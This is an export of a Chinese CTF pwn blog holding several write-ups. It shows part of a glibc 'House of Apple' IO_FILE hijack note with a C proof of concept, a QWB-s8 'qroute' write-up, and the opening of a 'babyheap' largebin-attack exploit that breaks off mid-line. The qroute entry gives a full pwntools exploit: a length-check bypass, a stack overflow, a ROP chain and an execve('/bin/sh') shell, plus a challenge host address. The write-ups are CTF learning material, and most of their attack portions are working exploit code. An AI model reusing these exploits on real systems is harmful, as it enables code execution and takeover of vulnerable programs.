<h2 id="6、-IO-wdoallocbuf-–-tartget-FUNC"><a href="#6、-IO-wdoallocbuf-–-tartget-FUNC" class="headerlink" title="6、_IO_wdoallocbuf –&gt; tartget_FUNC"></a>6、_IO_wdoallocbuf –&gt; tartget_FUNC</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_wdoallocbuf --&gt; tartget_FUNC</span><br><span class="line">void</span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    return;</span><br><span class="line">  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      return;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936465357-d1b72c30-fe71-44b2-9e4c-2b9c680a6550.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>看这个，所以首先满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>然后<code>fp-&gt;_flags &amp; 0x2 == 0</code></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936201181-b7631f9a-6b20-4174-a9f5-a1235702943f.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>跟进去看下，一下是跟进之后的每个跳转</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936215949-6dc300c0-0d47-4432-82cc-691d00e41451.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936245818-34eadbcd-46f8-44ec-acb5-faf478c3a47b.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936254711-39dd61a4-0d49-4775-8383-3ade0b425c98.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936265284-6cdb4cc5-2cda-4a86-9457-c7899ea24afc.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>这里是把vtable当做一个函数了吗，其实并不是，而是<code>vtable + 0x68</code>，可以调试看下</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715936760414-e997daad-897a-4c97-892a-80fee5825c6c.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>也就是说其实就是调用了<code>_wide_data[0xe0][0x68]</code>也就是我们要写入的target_func</p>
<p>我们在<code>_flags</code>中写入1，最后把<code>_wide_data[0xe0][0x68]</code>改为puts函数</p>
<p>效果</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715938579307-ecac8ece-dad5-47e1-8606-c4a4e67666c5.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    size_t puts_addr = &amp;puts;</span><br><span class="line">    size_t libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    size_t * _IO_list_all_ = libc_base + <span class="number">0x21a680</span>;</span><br><span class="line">    size_t * stderr_ = libc_base + <span class="number">0x21a860</span>;</span><br><span class="line">    size_t * ptr = malloc(<span class="number">0x500</span>);</span><br><span class="line">    size_t _IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span>;</span><br><span class="line">    ptr[-<span class="number">2</span>] = <span class="string">&#x27;1&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    * _IO_list_all_ = ptr - <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">0</span>;//_IO_write_base <span class="keyword">and</span> _wide_data-&gt;_IO_write_base</span><br><span class="line">    ptr[<span class="number">3</span>] = <span class="number">1</span>;//_IO_write_ptr</span><br><span class="line">    ptr[<span class="number">0x19</span>] = _IO_wfile_jumps;//vtable</span><br><span class="line">    ptr[<span class="number">0x12</span>] = ptr - <span class="number">2</span>;//_wide_data = fake_IO_list_all</span><br><span class="line">    ptr[<span class="number">26</span>] = ptr - <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">11</span>] = puts_addr;</span><br><span class="line"></span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><code>fp-&gt;_mode &lt;= fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
<li><code>f-&gt;_flags &amp; 0x8 ==0</code></li>
<li><code>f-&gt;_flags &amp; 0x800 == 0</code></li>
<li><code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code></li>
<li><code>fp-&gt;_flags &amp; 0x2 == 0</code></li>
<li><code>_wide_data[0xe0][0x68] = target_func</code></li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>IO_FILE</category>
        <category>House of apple</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>IO_FILE</tag>
        <tag>House of apple</tag>
      </tags>
  </entry>
  <entry>
    <title>QWB-s8 qroute</title>
    <url>/posts/QWB-s8-qroute.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在本次强网杯中这道qroute我们队伍并没有做出来，是赛后复现的</p>
<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>由于这道题目是由go语言进行编写的，IDA中的代码并不是特别好分析，所以这次采用动静结合的方式进行分析，在分析中发现一部分功能需要进入config模式，但是进入该模式需要验证license，根据程序中的一些函数名猜测license加密用的可能是rc4，但是由于他的key在IDA中可以看到是固定的，所以我们利用gdb进行调试可以调试出license。</p>
<h2 id="寻找license"><a href="#寻找license" class="headerlink" title="寻找license"></a>寻找license</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241107143815972.png"
                      alt="image-20241107143815972"
                ><figcaption>image-20241107143815972</figcaption></figure></p>
<p>我们将断点定在加密函数执行完毕，观察此时寄存器的值</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241107143805009.png"
                      alt="image-20241107143805009"
                ><figcaption>image-20241107143805009</figcaption></figure></p>
<p>这便是license的值，可以运行程序进行验证</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241107143905123.png"
                      alt="image-20241107143905123"
                ><figcaption>image-20241107143905123</figcaption></figure></p>
<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241107144826240.png"
                      alt="image-20241107144826240"
                ><figcaption>image-20241107144826240</figcaption></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在搜索同类题目之后发现。该类题目大多都是ping处存在栈溢出漏洞，比赛也是重点放在该部分，但是并没有找到溢出点。是赛后复现出的。</p>
<p>在分析ping函数的时候，发现了v70会进行长度检测，应该是我们输入的内容，将其改名为rop，之后后面的代码就会很明显的看到其实是有一个栈溢出的</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241108123743995.png"
                      alt="image-20241108123743995"
                ><figcaption>image-20241108123743995</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241108123851181.png"
                      alt="image-20241108123851181"
                ><figcaption>image-20241108123851181</figcaption></figure></p>
<p>在前面有一个</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241108123907963.png"
                      alt="image-20241108123907963"
                ><figcaption>image-20241108123907963</figcaption></figure></p>
<p>是处理IP地址中的<code>.</code>的，尝试使用<code>.</code>进行阶段，发现可以绕过长度检测，接着就是构造ROP链，在这个go程序中没有比较好用的gadget，只能东拼西凑了。。。。</p>
<p>需要注意的是，即使构造出rop链也不可以超过0x3f大小，可以使用<code>.</code>进行隔断</p>
<h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import ctypes</span><br><span class="line">from struct import pack</span><br><span class="line">import numpy as np</span><br><span class="line">from ctypes import *</span><br><span class="line">from math import log</span><br><span class="line">import warnings</span><br><span class="line">banary = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line"># libc = ELF(&quot;./libc-2.35.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span><br><span class="line"># warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)</span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def debug(a=&#x27;&#x27;):</span><br><span class="line">    if a != &#x27;&#x27;:</span><br><span class="line">        gdb.attach(io, a)</span><br><span class="line">        pause()</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">        pause()</span><br><span class="line">def cal(x, y):</span><br><span class="line">    return ((x - y) + 0x10000) % 0x10000</span><br><span class="line">def get_sb():</span><br><span class="line">    return base + libc.sym[&#x27;system&#x27;], base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">rud = lambda text: io.recvuntil(text, drop=True)</span><br><span class="line">rl = lambda : io.recvline()</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(6),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line">lss = lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))</span><br><span class="line">p = lambda s: print(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">url = &#x27;1.95.68.23:58924&#x27;</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">    #io = process(banary, env=&#123;LD_LIBRARY:&#x27;./libc.so&#x27;&#125;)</span><br><span class="line">    #io = process(banary,stdin=PTY,raw=False)</span><br><span class="line">else:</span><br><span class="line">    io = remote(*url.replace(&#x27;:&#x27;, &#x27; &#x27;).split())</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">def cert(lisence):</span><br><span class="line">    sla(&quot;Router# &quot;, b&#x27;cert &#x27; + lisence)</span><br><span class="line">    ru(&quot;Authorization successful.\n&quot;)</span><br><span class="line">def conf_t():</span><br><span class="line">    sla(&quot;Router# &quot;, b&#x27;configure&#x27;)</span><br><span class="line">    ru(&quot;Entered configuration mode.\n&quot;)</span><br><span class="line">def set_cmd(cmd, </span><br><span class="line">            dns1=None, dns2=None, </span><br><span class="line">            route=None, via=None, interface_a=None, </span><br><span class="line">            interface_b=None, ip=None, MAC=None, status=None):</span><br><span class="line">    if cmd == b&#x27;dns&#x27;:</span><br><span class="line">        if dns1 and dns2:</span><br><span class="line">            sla(&quot;Router(config)# &quot;, b&#x27;set dns &#x27; + str(dns1).encode() + b&#x27; &#x27; + str(dns2).encode())</span><br><span class="line">    elif cmd == b&#x27;route&#x27;:</span><br><span class="line">        if route and via and interface_a:</span><br><span class="line">            sla(&quot;Router(config)# &quot;, b&#x27;set route &#x27; + str(route).encode() + </span><br><span class="line">                b&#x27; &#x27; + str(via).encode() + b&#x27; &#x27; + str(interface_a).encode())</span><br><span class="line">    elif cmd == b&#x27;interface&#x27;:</span><br><span class="line">        if interface_b and ip and MAC and status:</span><br><span class="line">            sla(&quot;Router(config)# &quot;, b&#x27;set interface &#x27; + str(interface_b).encode() + </span><br><span class="line">                b&#x27; &#x27; + str(ip).encode() + b&#x27; &#x27; + str(MAC).encode() + b&#x27; &#x27; + str(status).encode())</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Error: Unknown command.&quot;)</span><br><span class="line">def set_route(route):</span><br><span class="line">    io.sendlineafter(&quot;Router&quot;,b&quot;set route &quot; + route)</span><br><span class="line"></span><br><span class="line">def set_dns(dns,ip):</span><br><span class="line">    io.sendlineafter(b&quot;Router&quot;,b&quot;set dns &quot; + dns + b&quot; &quot; + ip)</span><br><span class="line"></span><br><span class="line">def _exit():</span><br><span class="line">    sla(&quot;Router(config)# &quot;, b&#x27;exit&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------------------</span><br><span class="line">script = &#x27;&#x27;&#x27;</span><br><span class="line">    b *0x4D8FFD\n</span><br><span class="line">    # b *0x4D6AA0\n</span><br><span class="line">    # b *0x4D81B1\n</span><br><span class="line">    b *0x43fac9\n</span><br><span class="line">    b *0x4D8587\n</span><br><span class="line">    b *0x004D858C\n</span><br><span class="line">    b *0x0x48DB60</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"># gdb.attach(io, script)</span><br><span class="line"></span><br><span class="line">lisence = b&#x27;4ceb539da109caf8eea7&#x27;</span><br><span class="line">cert(lisence)</span><br><span class="line">conf_t()</span><br><span class="line">#---------</span><br><span class="line">pop_rbx = 0x461dc1</span><br><span class="line">pop_rcx = 0x433347</span><br><span class="line">pop_rbp = 0x401030</span><br><span class="line">read = 0x48DB60</span><br><span class="line">leave_ret = 0x4a721a</span><br><span class="line">bss = elf.bss() + 0x800</span><br><span class="line">pop_rdi = 0x4c23dd</span><br><span class="line">pop_rax_ret6 = 0x47afe4</span><br><span class="line">mov_rsi_rax_ret = 0x41054f</span><br><span class="line">pop_rax_pop_rbp_ret = 0x405368</span><br><span class="line">#---------</span><br><span class="line"></span><br><span class="line">payload = b&quot;.&quot;*0x207# + b&#x27;F&#x27;*0x800</span><br><span class="line">payload += p64(pop_rbp) + p64(bss)</span><br><span class="line">payload += p64(pop_rcx) + p64(0x200)</span><br><span class="line">payload += p64(pop_rbx) + p64(bss)</span><br><span class="line">payload += p64(read) + b&#x27;\x1a\x72\x4a\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line"># payload += </span><br><span class="line"></span><br><span class="line">set_dns(payload,b&#x27;1.1.1.1&#x27;)</span><br><span class="line"># set_cmd(b&#x27;dns&#x27;, dns1 = payload, dns2 = b&#x27;1.1.1.1&#x27;)</span><br><span class="line"># set_route(b&quot;A&quot;*0x3f+b&quot; BBBBB 1&quot;)</span><br><span class="line"># set_cmd(b&#x27;route&#x27;, route = b&#x27;A&#x27;*0x3f, via = b&#x27;BBBBB&#x27;, interface_a = b&#x27;1&#x27;)</span><br><span class="line"># sla(&quot;Router(config)# &quot;, b&#x27;exec ping host &#x27; + b&#x27;A&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">sla(&quot;Router(config)# &quot;, b&#x27;exec ping host &#x27; + payload)</span><br><span class="line">syscall = 0x004735A9</span><br><span class="line">payload = p64(0)</span><br><span class="line">payload += p64(pop_rax_pop_rbp_ret) + p64(0x3b) + p64(0)</span><br><span class="line">payload += p64(pop_rbx) + p64(bss+0x100)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">s(payload.ljust(0x100,b&quot;\x00&quot;)+b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line"># debug()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>WriteUPs</category>
        <category>QWB</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>WriteUPs</tag>
        <tag>QWB</tag>
      </tags>
  </entry>
  <entry>
    <title>QWB-s8 babyheap</title>
    <url>/posts/QWB-s8-babyheap.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题算是qwb最简单的一道题了，有两种做法，一种是largebin attack，一种是利用任意地址写修改got.plt表.</p>
<p>该题目主要是只能申请六次chunk。</p>
<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><p>一次show，通过show在largebin中的chunk就能把libc和heapbase都泄露出来。然后打apple的板子</p>
<p>exp：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">banary = <span class="string">&quot;./pwn_pe&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> a != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        gdb.attach(io, a)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x - y) + <span class="number">0x10000</span>) % <span class="number">0x10000</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> base + libc.sym[<span class="string">&#x27;system&#x27;</span>], base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">rud = <span class="keyword">lambda</span> text: io.recvuntil(text, drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">lss = <span class="keyword">lambda</span> s :log.success(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">p = <span class="keyword">lambda</span> s: <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">url = <span class="string">&#x27;47.94.231.2 28743&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">    <span class="comment">#io = process(banary, env=&#123;LD_LIBRARY:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment">#io = process(banary,stdin=PTY,raw=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(*url.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27; &#x27;</span>).split())</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">script = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    # b *$rebase(0x1D7B)\n</span></span><br><span class="line"><span class="string">    # b *$rebase(0x1D23)\n</span></span><br><span class="line"><span class="string">    # b *$rebase(0x1D46)\n</span></span><br><span class="line"><span class="string">    # b *$rebase(0x1E5F)\n</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your choice: \n&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter your commodity size \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter which to edit: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Input the content \n&quot;</span>, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter which to show: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter which to delete: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;Maybe you will be sad !\n&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">addr</span>):</span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    sa(<span class="string">&quot;Input your target addr \n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------</span></span><br><span class="line">add(<span class="number">0x558</span>)</span><br><span class="line">add(<span class="number">0x558</span>)</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x568</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;The content is here \n&quot;</span>)</span><br><span class="line">base = uheap() - <span class="number">0x21b120</span></span><br><span class="line">libc.address = base</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">10</span>)</span><br><span class="line">heapbase = uheap() - <span class="number">0x1950</span></span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line"><span class="comment"># ----------------------------</span></span><br><span class="line">leave_ret = base + <span class="number">0x4da83</span></span><br><span class="line">key_gadget = base + <span class="number">0x16a06a</span><span class="comment"># mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18];</span></span><br><span class="line"><span class="comment"># ----------------------------</span></span><br><span class="line">_lock = <span class="number">0xdeadbeef</span></span><br><span class="line">_IO_wfile_jumps = base + <span class="number">0x217000</span></span><br><span class="line">orw_addr = heapbase + <span class="number">0x1b78</span></span><br><span class="line">fake_io_addr = heapbase + <span class="number">0x1910</span></span><br><span class="line"><span class="comment"># ----------------------------</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(leave_ret) + p64(<span class="number">0</span>) + p64(libc.sym[<span 